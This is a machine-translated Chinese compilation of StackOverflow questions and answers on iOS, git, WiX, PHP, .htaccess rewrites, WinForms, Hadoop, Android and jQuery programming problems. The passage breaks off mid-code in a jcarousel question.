# StackOverflow 问答 15092000-15092999

# ios - 识别 UIWebView 中的多个链接

> ID：15092005
> 
> 赞同：0
> 
> 时间：2013-02-26T14:46:45.753
> 
> 标签：ios, objective-c, uiwebview

我有一个`UIWebView`并且我的网页中有多个链接，我想根据单击的链接从中打开链接，我想对不同的链接执行不同的操作，重点是如何识别不同的链接？我在用

```
 if (navigationType == UIWebViewNavigationTypeLinkClicked) {
        //link clicked... but which one?

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T14:48:47.300

您需要使用 找出点击了哪个网址，并使用我在下面显示的方法`request.URL`检查您点击的链接是什么`rangeOfString`

```
 if (navigationType == UIWebViewNavigationTypeLinkClicked) {

     if ([[request.URL absoluteString] rangeOfString:@"http://firstLink"].location!=NSNotFound){
            //perform your action..
     } else if ([[request.URL absoluteString]rangeOfString:@"http://secondLink"].location!=NSNotFound){
        /// perform action for second link..
      }    
  } 
```

# git - 致命：远程端意外挂断（写入对象：100％）

> ID：15092008
> 
> 赞同：1
> 
> 时间：2013-02-26T14:46:56.520
> 
> 标签：git, github, github-for-windows

我发现了一些案例，但它们并不相同，在这种情况下，git 说写入对象已完成，然后它失败了，知道为什么吗？

这是powershell控制台：

```
Counting objects: 1554, done.
Delta compression using up to 8 threads.
Compressing objects: 100% (1540/1540), done.
efrror: RPC failed; result=22, HTTP code = 413 84 KiB/s
atal: The remote end hung up unexpectedly
Writing objects: 100% (1554/1554), 492.13 MiB | 5.49 MiB/s, done.
Total 1554 (delta 102), reused 0 (delta 0)
fatal: The remote end hung up unexpectedly
Everything up-to-date 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T14:53:51.867

通过已重定向（通过服务器上的 apache）到 https 的 http 推送到远程存储库时，我遇到了同样的问题。

例如`git push http:<blah>`失败但`git push https:<blah>`有效

# wix - WIX Heat，通过heat改变子目录的名称？

> ID：15092010
> 
> 赞同：2
> 
> 时间：2013-02-26T14:47:05.493
> 
> 标签：wix, wix3.5

所以我使用 Wix 来安装我的应用程序，它运行良好，可以满足我的一切需求。我现在遇到的一个问题是这个。我在 VS 2010 Pre-build Event 命令中使用以下命令行参数：

```
heat.exe dir "C:\My Main Folder" -cg MyApplication -gg -scom -sreg -sfrag -dr APPLICATIONROOTDIRECTORY -var var.MyApplication -out "..\..\MyApplication.wxs" 
```

我的问题是生成的 .wxs 文件为我提供了以下文件夹结构：

```
<Fragment>
    <DirectoryRef Id="APPLICATIONROOTDIRECTORY">
        <Directory Id="dirB19DCB4311BD6C765579FE56A2C72DF8" Name="My Main Folder"> 
```

我的问题是，是否有一种方法可以传入一个可以更改“我的主文件夹”目录名称的参数，因为目前我正在手动更改它，但这非常无效，因此我们无法拥有一个自动化的构建过程。如果有人有任何建议或地方，我可以看看，那就太好了！现在，我正在利用“ *WiX：Windows Installer XML 开发人员指南*”一书尝试寻找解决方案，但没有找到任何解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T16:31:35.317

根据您的目标，我很想使用`-srd`来抑制根目录的生成，然后更改`-dr`参数以指向具有正确名称的目录。

除此之外，我认为唯一的其他简单选项可能是 XSL 转换，您可以通过指定`-t`参数来使用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T18:31:54.187

正如 ChrisPatrick 建议的那样，您可以使用`-srd`来抑制根目录的生成，并使用您自己的`-dr`.

```
heat.exe dir "C:\My Main Folder" -srd -dr "DIRNAMEHERE" 
```

您可以在此处找到更多信息，[热文档](http://wix.sourceforge.net/manual-wix3/heat.htm)

# ios - 在 iPad 上以横向模式启动 iPhone 应用程序

> ID：15092013
> 
> 赞同：5
> 
> 时间：2013-02-26T14:47:31.673
> 
> 标签：ios, ipad, orientation, splash-screen

在项目摘要中，“支持的界面方向”都被选中，因为我的应用程序中有一个照片库视图，可以随设备旋转。其他视图仅为纵向。目标设备是 iPhone，所有的东西在 iPhone 中都表现良好。但是当它在我的 iPad 上以横向模式运行时，启动画面和 rootView 如下所示：

飞溅景观： ![在此处输入图像描述](../Images/fae0819329397d072ce9f3ecde3b1cfe.png)

根视图景观： ![在此处输入图像描述](../Images/e0c44ddafa8ae007c7e0ca52279288a8.png)

我期望的外观应该与 iPad 的纵向模式相同：

飞溅肖像： ![在此处输入图像描述](../Images/33be97c6bdf8a1417e02cc31c3f329dd.png)

根视图肖像： ![在此处输入图像描述](../Images/16e752a35a09257f607a70210c5cd638.png)

rootView 是`MyNavigationController`，相关代码如下：

**我的导航控制器.m**

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
  return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

- (NSUInteger)supportedInterfaceOrientations {
  return UIInterfaceOrientationMaskPortrait;
}

- (BOOL)shouldAutorotate {
  return NO;
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T20:30:31.820

请使用以下内容更正您的代码：

```
- (BOOL)shouldAutorotate {
   return YES;
}

- (NSUInteger)supportedInterfaceOrientations {
   return UIInterfaceOrientationMaskPortrait;
} 
```

`YES`从`shouldAutorotate`. _ 事实是，如果您确实 return `NO`，则`supportedInterfaceOrientations`根本不会被调用，并且您的项目设置将成为规则。您也可以删除`shouldAutorotate`它，它应该可以正常工作。

[参考](http://developer.apple.com/library/ios/documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/supportedInterfaceOrientations)：

> 当用户更改设备方向时，系统会在根视图控制器或填充窗口的最顶部呈现的视图控制器上调用此方法。如果视图控制器支持新方向，则窗口和视图控制器将旋转到新方向。**仅当视图控制器的 shouldAutorotate 方法返回 YES 时才会调用此方法。**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T17:13:12.093

我想你想要的是将状态栏也设为纵向。不幸的是，没有简单的方法可以做到这一点——您可以将设备/界面方向设置为仅纵向，但它适用于整个应用程序。您需要自己处理所有视图的方向。所以，我建议你按照[Hide status bar on launch image](https://stackoverflow.com/questions/11864993/hide-status-bar-on-launch-image)，隐藏你的状态栏，并在两个方向使用相同的图像。它将使启动画面看起来更好。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-01T08:54:11.837

您的意思是显示横向启动屏幕然后在应用程序中仍然使用纵向模式吗？

据我所知，仅限 iPhone 的应用程序无法以横向模式启动，这意味着为仅限 iPhone 的应用程序提供横向启动屏幕是没有用的。

[在](http://developer.apple.com/library/ios/#documentation/iphone/conceptual/iphoneosprogrammingguide/App-RelatedResources/App-RelatedResources.html#//apple_ref/doc/uid/TP40007072-CH6-SW11)“提供特定于设备的启动映像”部分查看文档。

# ios - 如何在后台运行 NSTimer 并在 iOS 中休眠？

> ID：15092016
> 
> 赞同：3
> 
> 时间：2013-02-26T14:47:47.743
> 
> 标签：ios, cocoa-touch, nstimer

我在stackoverflow中发现了很多关于`NSTimer`后台运行的帖子。

但是我没有找到任何解决方案。

在我的应用程序中，我在后台播放声音，并设置计时器以在到达该时间时停止音乐。

所以我需要运行我的`NSTimer`背景（意味着当点击主页按钮和睡眠 iPhone 时）。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-10-04T06:33:58.680

```
// NSTimer run when app in background <br>

[[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:nil];
loop = [NSTimer scheduledTimerWithTimeInterval:0.25 target:self selector:@selector(Update) userInfo:nil repeats:YES];
[[NSRunLoop currentRunLoop] addTimer:loop forMode:NSRunLoopCommonModes]; 
```

这是你想要的吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T15:36:21.833

## 你不能

计时器仅存在于您的应用程序中。所以（除了一个非常小的窗口）当你的应用程序被发送到后台时，计时器不能再触发了。

（音频继续运行，因为它是由*系统*播放的，而不是由您的应用程序播放的。）

因此，您不能为此目的使用计时器。

正如 iPatel 建议的那样，您可以做的是使用本地通知。这将短暂唤醒您的应用程序，让您停止播放音乐。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-26T15:26:02.133

获取表单 [此问题] ( [http://iphonedevsdk.com/forum/iphone-sdk-development/58643-keep-nstimer-running-when-app-is-in-background-multitasking.html](http://iphonedevsdk.com/forum/iphone-sdk-development/58643-keep-nstimer-running-when-app-is-in-background-multitasking.html) )

```
- (void)btnSetupNotificationClicked:(id)sender
{
    UILocalNotification* pOrderCompletedNotification=[[UILocalNotification alloc] init];
    if(pOrderCompletedNotification!=nil)
    {
        [pOrderCompletedNotification setFireDate:[[NSDate alloc] initWithTimeIntervalSinceNow:5.00]];
//      [pOrderCompletedNotification setApplicationIconBadgeNumber:1];
        [pOrderCompletedNotification setTimeZone:[NSTimeZone systemTimeZone]];
        [pOrderCompletedNotification setSoundName:@\"OrderCompleted.m4a\"];
        [pOrderCompletedNotification setAlertBody:@\"Order Completed\"];
        [pOrderCompletedNotification setAlertAction:nil];
        [pOrderCompletedNotification setHasAction:NO];

        UIApplication* pApplication=[UIApplication sharedApplication];
        if(pApplication!=nil)
        {
            [pApplication scheduleLocalNotification:pOrderCompletedNotification];
        }
        else
        {
            NSLog(@\"Application singleton allocation error.\");
        }

        [pOrderCompletedNotification release];
        [pApplication release];
    }
    else
    {
        NSLog(@\"Local notification creation error.\");
    }   // if
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-24T11:53:57.297

使用斯威夫特

```
let app = UIApplication.sharedApplication()
app.beginBackgroundTaskWithExpirationHandler(nil)
let timer = NSTimer.scheduledTimerWithTimeInterval(1,
            target: self,
            selector:"DoSomethingFunctions",
            userInfo: nil,
            repeats: true)
NSRunLoop.currentRunLoop().addTimer(timer, forMode: NSRunLoopCommonModes) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-06-23T18:12:49.347

我知道这篇文章相对较旧，但我最近遇到了这个问题并且在弄清楚它时遇到了一些麻烦。这是我在 Swift 5 中提出的解决方案。它结合了 RunLoop 和 Timer 类，在下面提供的链接中提供了有关它们的信息。

使用定时器

*   [https://developer.apple.com/documentation/foundation/timer](https://developer.apple.com/documentation/foundation/timer)

使用运行循环</p>

*   [https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Multithreading/RunLoopManagement/RunLoopManagement.html#//apple_ref/doc/uid/10000057i-CH16-SW1](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Multithreading/RunLoopManagement/RunLoopManagement.html#//apple_ref/doc/uid/10000057i-CH16-SW1)

*   [https://developer.apple.com/documentation/foundation/runloop](https://developer.apple.com/documentation/foundation/runloop)

示例代码：

```
class AMSleepTimerUtil: NSObject {
    static let shared = AMSleepTimerUtil()
    fileprivate var sleepTimer: Timer?

    /// Initialize the timer to trigger a function to execute after a duration of time
    /// - Parameter seconds: the time delay until the selector function executes
    /// - Returns: true if sleep timer were successfully initialized
    func createTimerToStopMusic(at seconds: TimeInterval) -> Bool {
        let fireAtDate = Date(timeIntervalSinceNow: seconds)
        stopSleepTimer()

        self.sleepTimer = Timer(fireAt: fireAtDate,
                                interval: 0,
                                target: self,
                                selector: #selector(pauseMusic),
                                userInfo: nil,
                                repeats: false)
        guard let sleepTimer = sleepTimer else { return false }
        RunLoop.main.add(sleepTimer, forMode: .common)

        return true
    }

    func pauseMusic() {
        guard let audioPlayer = AMNowPlayingViewController.sharedInstance()?.audioPlayer else { return }

        audioPlayer.pause()
    }

    /// Used to reset the sleep timer before initializing a new timer if the user clicks the "Set Timer" multiple times
    func stopSleepTimer() {
        if sleepTimer != nil {
            sleepTimer?.invalidate()
            sleepTimer = nil
        }
    }

    func sleepTimerIsActive() -> Bool {
        return self.sleepTimer != nil
    }
} 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2013-02-26T15:04:51.293

当您运行时`NSTimer`，该`@selector`方法本身将确定您要在后台运行还是在主线程中运行。

**最初设定：**

```
self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(manageMethod) userInfo:nil repeats:YES]; //@property (nonatomic, strong) NSTimer *scanTimer 
```

**您想在后台运行的案例：**

```
-(void)manageMethod
{
      dispatch_queue_t queue = dispatch_queue_create("com.mysite.thread1",NULL);
      dispatch_async(queue,^{ 
           //run in background
      });
} 
```

# php - 在 PHP 中将一个变量与多个（一组）变量进行比较，结果相同

> ID：15092019
> 
> 赞同：0
> 
> 时间：2013-02-26T14:48:15.087
> 
> 标签：php, navigation

我有一个简单的导航，它使用 php 来了解您在哪个“当前页面”上，允许我的 css 指示这一点。

我的PHP代码：

```
<?php echo "\n"; if ($currentPage == 'about.php') { ?> 
```

我想要做的是让这个按钮作为其子页面中的当前页面处于活动状态？有没有办法在上面的代码中有多个页面？

我试过这个，但它不起作用

```
<?php echo "\n"; if ($currentPage == 'about.php about2.php about3.php') { ?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T14:51:05.023

您可以使用[`in_array`](http://php.net/manual/en/function.in-array.php)：

```
<?php $pages = Array("about.php","about2.php","about3.php"); ?>
<?php echo "\n"; if (in_array($currentPage,$pages)) { ?> 
```

它基本上会通过一个数组并将值 ( `$currentPage`) 与数组中的每个值进行比较。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T14:52:14.263

您可以使用该`in_array()`功能： http: [//php.net/manual/en/function.in-array.php](http://php.net/manual/en/function.in-array.php)

```
if (in_array($currentPage, array('about.php', 'about2.php'))) {
// Do Something
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T14:46:46.670

（不是一个答案只是一个更新）

这就是我目前所拥有的：（只有 about.php 激活了开关）

```
 <?php $pages = Array("about.php","about2.php","about3.php"); ?>
        <?php echo "\n"; if (in_array($currentPage,$pages)) { ?>
            <li class="button on">
            <img src="style/images/clear.png" width="100px" height="100px" alt="clear_image" />
            About
            </li>
            <?php } else { ?>
            <li class="button off">
                <a class="nav" href="about.php">
                    <img src="style/images/clear.png" width="100px" height="100px" alt="clear_image" />
                    About
                </a>
            </li>
        <?php } ?> 
```

如果我将页面更改为 home.php，contact.php（最初在导航中）它们都可以同时打开它们吗？所以我不确定我需要做什么才能包含我的新页面？

我这是我的其他按钮之一：

```
 <?php echo "\n"; if ($currentPage == 'contact.php') { ?>
            <li class="button on">
                <img src="style/images/clear.png" width="100px" height="100px" alt="clear_image" />
                Contact
            </li>
            <?php } else { ?>
            <li class="button off">
                <a class="nav" href="contact.php">
                    <img src="style/images/clear.png" width="100px" height="100px" alt="clear_image" />
                    Contact
                </a>
            </li>
        <?php } ?> 
```

这就是为什么它会拾取原始页面而不是我的新页面的原因吗？

# .htaccess - .htaccess 将 /files/users/1/file.pdf 重写为 /view/?file=file.pdf

> ID：15092024
> 
> 赞同：-1
> 
> 时间：2013-02-26T14:48:27.783
> 
> 标签：.htaccess, mod-rewrite

我很糟糕，`mod_rewrite`但是我需要重写对文件夹的任何请求`/files/users/*/`（* 是通配符）`/view/`并将文件名插入到查询参数中，如下所示：

`/files/users/9/test.pdf`变成`/view/?file=test.pdf`

假设`.htaccess`文件将位于内部，我将如何处理`/files/users/`？

如果您在我慢慢尝试熟悉的过程中解释您的解决方案如何工作，我将不胜感激`mod_rewrite`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:40:32.990

所以，你想把我所有的商业机密都放在银盘上吗？

嗯，我尽力了。;-)

首先，您必须知道文档在哪里。在这里寻找参考：[`mod_rewrite`](http://httpd.apache.org/docs/current/mod/mod_rewrite.html)。或者[`mod_rewrite`](http://httpd.apache.org/docs/2.2/mod/mod_rewrite.html)，如果您的 Apache 版本是 2.2。

[您将在Apache mod_rewrite](http://httpd.apache.org/docs/current/rewrite/)中找到包含大量链接的概述。在那里，您会找到关于重写 URL的精彩[介绍。](http://httpd.apache.org/docs/current/rewrite/intro.html)还可以在这里查看许多标准示例。

由于 mod_rewrite 支持 PCRE 正则表达式，因此您可能不时需要[perlre](http://perldoc.perl.org/perlre.html)和/或[regular-expression.info](http://www.regular-expressions.info/)。

现在回答你的问题

```
RewriteEngine On
RewriteRule ^(?:.+?)/(.*) /view/?file=$1 
```

这可能已经足够了。`(?:.+?)`它在该子目录中查找子目录`/files/users`并捕获文件的名称`(.*)`。如果此模式匹配，它会重写 URL`/view/?file=`并将捕获的文件附加到`$1`，这给出`/view/?file=$1`.

当然，所有未经测试的人都玩得开心。

PS 附加信息在[.htaccess info](https://stackoverflow.com/tags/.htaccess/info)和[.htaccess faq](https://stackoverflow.com/questions/tagged/.htaccess?sort=faq)处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:43:39.377

将以下指令放入您的`.htaccess`文件中以**重写** `/files/users/9/test.pdf`为`/view/?file=test.pdf`. 实际上，这意味着如果您访问[http://yourdomain.com/files/users/9/test.pdf](http://yourdomain.com/files/users/9/test.pdf) ，那么将为访问者提供*重写的 url*，即[http://yourdomain.com/view?file=test .pdf](http://yourdomain.com/view?file=test.pdf)

```
RewriteRule ^[^/]+/(.*)$ /view/?file=$1 [L] 
```

[RewriteRule](https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewriterule)指令是 Apache [mod_rewrite](https://httpd.apache.org/docs/current/mod/mod_rewrite.html)模块的一部分。它需要两个参数：

1.  *模式*- 与当前 URL 路径匹配的[正则表达式](http://www.regular-expressions.info/)（请注意，URL 路径不是整个 URL，而是例如**/my/path**，但在`.htaccess`上下文中，前导斜杠**/**被剥离给我们**my/path**）。
2.  *替换*- 用户将重写或重定向到的目标 URL 或路径。

## 解释规则

模式`^[^/]+/(.*)$`：

```
^    - the regex must match from the start of the string
[^/] - match everything but forward slash 
+    - repetition operator which means: match 1 or more characters
/    - matches a forward slash
(.*) - mathes any characters. The dot means match any character. The star operator means match ANY characters (0 or more). The parantheses means the match is grouped and can be used in backreferences.
$    - the regex must match until the end of the string 
```

替换`/view/?file=$1`：

...意味着我们`/view/`用查询参数文件重写了文件夹的 URL 路径。查询参数`file`将包含*模式*中的第一个分组匹配，因为我们将`$1`值传递给它（这意味着我们的 RewriteRule 模式中的第一个匹配）。

旗帜`[L]`：

...意味着*mod_rewrite*将停止处理重写规则。这很方便避免不必要的行为和/或无限循环。

# c# - 如何在继承的 WinForm 中将控件添加到容器

> ID：15092025
> 
> 赞同：4
> 
> 时间：2013-02-26T14:48:28.503
> 
> 标签：c#, winforms, panel, designer

我在另一个项目中有一个基本表单，它对我们所有的 WinForms 程序强制执行相同的外观和感觉。我从那个 BaseForm 继承来创建我自己的模板 BaseView。我的这个模板有额外的控件，比如 ProgressBar、Timer 和 TableLayoutPanel。

我现在想从我的 BaseView 继承并使用设计器添加我的程序特定控件，但是我不能将面板或任何其他控件之类的东西放入其中。我尝试了一些建议，例如确保基本表单的组件是公开的，但无济于事 - 大多数 TLP 的属性仍然是灰色的。

有人可以给我任何建议吗？非常感谢！

* * *

```
partial class BaseView
{
    /// <summary>
    /// Required designer variable.
    /// </summary>
    private System.ComponentModel.IContainer components = null;

    /// <summary>
    /// Clean up any resources being used.
    /// </summary>
    /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
    protected override void Dispose(bool disposing)
    {
        if (disposing && (components != null))
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    #region Windows Form Designer generated code

    /// <summary>
    /// Required method for Designer support - do not modify
    /// the contents of this method with the code editor.
    /// </summary>
    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BaseView));
        this.tableLayoutPanel_Form = new System.Windows.Forms.TableLayoutPanel();
        this.panel_Buttons = new System.Windows.Forms.Panel();
        this.panel_MainBody = new System.Windows.Forms.Panel();
        this.progressBar = new System.Windows.Forms.ProgressBar();
        this.timer_ProgressBar = new System.Windows.Forms.Timer(this.components);
        this.tableLayoutPanel_Form.SuspendLayout();
        this.SuspendLayout();
        // 
        // lblFormId
        // 
        this.lblFormId.AutoSize = false;
        this.lblFormId.Location = new System.Drawing.Point(390, 9);
        this.lblFormId.Size = new System.Drawing.Size(98, 13);
        this.lblFormId.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
        // 
        // btnClose
        // 
        this.btnClose.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.btnClose.DialogResult = System.Windows.Forms.DialogResult.Cancel;
        this.btnClose.Location = new System.Drawing.Point(447, 5);
        this.btnClose.Size = new System.Drawing.Size(41, 21);
        this.btnClose.TabIndex = 4;
        // 
        // tableLayoutPanel_Form
        // 
        this.tableLayoutPanel_Form.ColumnCount = 1;
        this.tableLayoutPanel_Form.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100F));
        this.tableLayoutPanel_Form.Controls.Add(this.panel_Buttons, 0, 2);
        this.tableLayoutPanel_Form.Controls.Add(this.panel_MainBody, 0, 1);
        this.tableLayoutPanel_Form.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tableLayoutPanel_Form.Location = new System.Drawing.Point(0, 0);
        this.tableLayoutPanel_Form.Name = "tableLayoutPanel_Form";
        this.tableLayoutPanel_Form.RowCount = 3;
        this.tableLayoutPanel_Form.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 30F));
        this.tableLayoutPanel_Form.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100F));
        this.tableLayoutPanel_Form.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 30F));
        this.tableLayoutPanel_Form.Size = new System.Drawing.Size(496, 322);
        this.tableLayoutPanel_Form.TabIndex = 26;
        // 
        // panel_Buttons
        // 
        this.panel_Buttons.Dock = System.Windows.Forms.DockStyle.Fill;
        this.panel_Buttons.Location = new System.Drawing.Point(3, 295);
        this.panel_Buttons.Name = "panel_Buttons";
        this.panel_Buttons.Size = new System.Drawing.Size(490, 24);
        this.panel_Buttons.TabIndex = 0;
        // 
        // panel_MainBody
        // 
        this.panel_MainBody.Dock = System.Windows.Forms.DockStyle.Fill;
        this.panel_MainBody.Location = new System.Drawing.Point(3, 33);
        this.panel_MainBody.Name = "panel_MainBody";
        this.panel_MainBody.Size = new System.Drawing.Size(490, 256);
        this.panel_MainBody.TabIndex = 1;
        // 
        // progressBar
        // 
        this.progressBar.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.progressBar.Location = new System.Drawing.Point(383, 324);
        this.progressBar.Name = "progressBar";
        this.progressBar.Size = new System.Drawing.Size(112, 21);
        this.progressBar.TabIndex = 27;
        // 
        // timer_ProgressBar
        // 
        this.timer_ProgressBar.Interval = 700;
        this.timer_ProgressBar.Tick += new System.EventHandler(this.timer_Tick);
        // 
        // BaseView
        // 
        this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
        this.CancelButton = this.btnClose;
        this.ClientSize = new System.Drawing.Size(496, 346);
        this.Controls.Add(this.progressBar);
        this.Controls.Add(this.tableLayoutPanel_Form);
        this.Cursor = System.Windows.Forms.Cursors.Default;
        this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
        this.MinimumSize = new System.Drawing.Size(512, 384);
        this.Name = "BaseView";
        this.Controls.SetChildIndex(this.btnClose, 0);
        this.Controls.SetChildIndex(this.tableLayoutPanel_Form, 0);
        this.Controls.SetChildIndex(this.lblFormId, 0);
        this.Controls.SetChildIndex(this.lblFormDescription, 0);
        this.Controls.SetChildIndex(this.progressBar, 0);
        this.tableLayoutPanel_Form.ResumeLayout(false);
        this.ResumeLayout(false);
        this.PerformLayout();

    }

    #endregion

    private System.Windows.Forms.ProgressBar progressBar;
    private System.Windows.Forms.Timer timer_ProgressBar;
    public System.Windows.Forms.TableLayoutPanel tableLayoutPanel_Form;
    public System.Windows.Forms.Panel panel_Buttons;
    public System.Windows.Forms.Panel panel_MainBody;
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-02-27T08:11:48.753

[这篇](http://msdn.microsoft.com/en-us/library/1z3efhd2.aspx)MSDN 文章给了我答案。

*“并非所有控件都支持从基本表单进行视觉继承。以下控件不支持本演练中描述的场景：**WebBrowser、ToolStrip、ToolStripPanel、TableLayoutPanel、FlowLayoutPanel、DataGridView**。继承表单中的这些控件始终为只读，无论您使用的修饰符（私有、受保护或公共）。”*

我使用停靠的 Panel 和 SplitContainer 而不是 TLP，现在我可以将任何我想要的东西放入其中。

# ios - 在 TextView 中为文本添加颜色

> ID：15092043
> 
> 赞同：-1
> 
> 时间：2013-02-26T14:49:08.020
> 
> 标签：ios, xcode

我有一个 TextView，我需要一些文本来更改颜色和字体。除核心文本外，任何方法都可用。请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T14:51:25.053

> 我需要一些文字来改变颜色和字体。

你肯定在寻找[NSAttributedString](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSAttributedString_Class/Reference/Reference.html)

* * *

从[源头](https://stackoverflow.com/questions/3786528/iphone-ipad-how-exactly-use-nsattributedstring)

```
NSMutableAttributedString *str = [[NSMutableAttributedString alloc] initWithString:@"Hello. That is a test attributed string."];
[str addAttribute:NSBackgroundColorAttributeName value:[UIColor yellowColor] range:NSMakeRange(3,5)];
[str addAttribute:NSForegroundColorAttributeName value:[UIColor greenColor] range:NSMakeRange(10,7)];
[str addAttribute:NSFontAttributeName value:[UIFont fontWithName:@"HelveticaNeue-Bold" size:20.0] range:NSMakeRange(20, 10)];
label.attributedText = str; 
```

# hadoop - 文件系统不支持错误

> ID：15092045
> 
> 赞同：2
> 
> 时间：2013-02-26T14:49:16.587
> 
> 标签：hadoop, mapreduce

我正在使用 hadoop 库**org.apache.hadoop.fs**。尝试使用类**FileSystem的****append()**方法时，它显示错误

 **```
 java.io.IOException: Not supported
at org.apache.hadoop.fs.ChecksumFileSystem.append(ChecksumFileSystem.java:291) 
```

我正在使用以下语句，

```
fileSystem.append(path,getConf().getInt("io.file.buffer.size", 4096), null); 
```

我正确配置了所有内容。请帮助我找到此问题的原因/解决方案**

# android - 带有 bindService 的服务在任务管理器上不可见

> ID：15092046
> 
> 赞同：0
> 
> 时间：2013-02-26T14:49:17.543
> 
> 标签：android, service

`startService(Intent)`我的应用程序有两个组件，即主要活动和服务，如果我在设备的任务管理器中看到我可以看到（1 进程 1 服务）但我需要服务之间的双向通信，则构建服务并调用和我的活动。

现在我必须使用`bindService(service, conn, flags)`并且通信按预期工作，但我可以在任务管理器中看到该过程。

# javascript - jQuery：setInterval 函数无故停止工作

> ID：15092052
> 
> 赞同：2
> 
> 时间：2013-02-26T14:49:33.640
> 
> 标签：javascript, jquery

我对 setInterval() 函数有疑问。

我希望文本每隔几秒钟改变一次颜色（请不要问我为什么）。我想出了一个使用 jQuery setInterval() 函数来实现这一点的想法，但它并没有像我预期的那样工作。

的HTML：

```
<a href="skup" id="highlight">Highlighting text</a> 
```

CSS：

```
a#highlight{
    color: #000000;
    text-decoration: none;
} 
```

和 JS：

```
 setInterval(function() {
    $('#highlight').css('color','#F79239');

    setTimeout(function(){$('#highlight').css('color','#000000');},2000);

}, 2000); 
```

jsfiddle 链接：http: [//jsfiddle.net/wbupY/](http://jsfiddle.net/wbupY/)

如您所见，该功能在颜色发生几次变化后停止工作。这可能是什么原因？

或者，也许您可​​以提出其他解决方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T14:52:03.733

底线是：不要混合`setTimeout()`和`setInterval()`.

相反，您应该使用`setInterval()`以下选项之一在每个“tick”处仅使用和切换项目状态：

### 使用 CSS 类

这可以说是最灵活的，因为它清晰地将脚本的关注点与项目的呈现分开。

CSS：

```
#highlight.colored {
  color: #f79239;
} 
```

JavaScript：

```
setInterval(function() {
    $('#highlight').toggleClass('colored');
}, 2000); 
```

### 使用显式样式更改

这不太灵活，但它确实允许您在两种以上的颜色之间切换。这是功能：

```
function toggleColors(id, colors, interval)
{
    // keep these values local to the function
    var $element = $(document.getElementById(id)),
    state = 0;

    setInterval(function() {
        $element.css('color', colors[state]);
        // advance (toggle) the state for the next tick
        state = (state + 1) % colors.length;
    }, interval);
}

toggleColors('highlight', ['#f79239', 'black'], 2000); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T14:55:32.330

带走 settimeout 试试这个

```
 setInterval(function() {
             $('#highlight').css('color')  == 'rgb(0, 0, 0)' ? $('#highlight').css('color','#F79239') : $('#highlight').css('color','#000000');
    }, 2000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T14:53:09.543

这是因为 setInterval 和 setTimeout 都有 2000

试试这个例如

```
 setInterval(function() {

      $('#highlight').css('color','#F79239');
      setTimeout(function(){$('#highlight').css('color','#000000');},2000);

}, 2100); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T14:53:55.337

两个时间都是一样的。将 setTimeout 减少到 1000

# c# - 如何在 jcarousel 中添加项目？在 C# 中

> ID：15092065
> 
> 赞同：0
> 
> 时间：2013-02-26T14:50:08.750
> 
> 标签：c#, jquery, html, jcarousel

我想使用 c# Webmethod + jquery Ajax 在 jcarousel 中添加项目

为此，我做了这样的事情：

我的 HTML 是这样的：

```
<div>
            <ul id="mycarousel" class="jcarousel-skin-tango" style="float: left">
            </ul>
        </div> 
```

jcarousel 和 Ajax 方法的 Jquery 代码是这样的：

```
 $("#mycarousel").empty();
        var element =jQuery('#mycarousel');
        $.ajax({
            url: "Home.aspx/GetProjectData",
            type: "POST",
            dataType: 'json',
